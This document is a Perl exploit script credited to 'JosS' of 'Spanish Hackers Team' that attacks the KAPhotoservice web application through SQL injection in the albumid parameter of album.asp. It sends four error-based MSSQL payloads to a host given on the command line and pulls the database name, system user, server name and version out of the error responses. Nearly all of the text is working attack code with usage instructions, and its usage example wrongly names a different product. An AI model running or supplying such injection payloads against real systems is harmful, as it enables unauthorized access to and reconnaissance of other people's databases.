#!/usr/bin/perl

# KAPhotoservice - Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team
# www.spanish-hackers.com

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = "";
if (index(lc($SO),"win")!=-1){
		   $linux="0";
	    }else{
		    $linux="1";
	    }
		if($linux){
system("clear");
}
else{
system("cls");
system ("title KAPhotoservice - Remote SQL Injection Exploit");
system ("color 02");
}

}

#*************************** expl ******************************


&lw;

print "\t\t########################################################\n\n";
print "\t\t#    KAPhotoservice - Remote SQL Injection Exploit     #\n\n";
print "\t\t#                        by JosS                       #\n\n";
print "\t\t########################################################\n\n";


$host=$ARGV[0];
chop $host;
$host=$host."/album.asp?cat=&apage=&albumid=";

if(!$ARGV[0]) {
    print "\n[x] KAPhotoservice - Remote SQL Injection Exploit\n";
    print "[x] written by JosS - sys-project[at]hotmail.com\n";
    print "[x] usage: perl $0 [host]\n";
    print "[x] example: http://host.com/PHPWebquest\n";
    exit(1);
 }

@comando=("1+and+1=convert(int,db_name())","1+and+1=convert(int,system_user)","1+and+1=convert(int,\@\@servername)--",'1+and+1=convert(int,@@version)--');


for ($i=0;$i<=3;$i++)

{

my $final = $host.$comando[$i];
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;

if ( $doc =~ /Syntax\s(.*)<\/font>/mosix )
{

if ($comando[$i] eq "1+and+1=convert(int,db_name())")
{

print "db_name:\n";

$dbname = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$dbname\n\n";

}

if ($comando[$i] eq "1+and+1=convert(int,system_user)")

{

print "system_user:\n";

$systemuser = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$systemuser\n\n";

}

if ($comando[$i] eq "1+and+1=convert(int,\@\@servername)--")

{

print "servername:\n";

$servername = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$servername\n\n";

}

if ($comando[$i] eq '1+and+1=convert(int,@@version)--')

{

print "version:\n";

$version = $1 if ($doc =~ /.*?value\s'(.*?)'\sto.*/sm);
print "$version\n\n";

}

} # Cierre del if principal
} # cierre for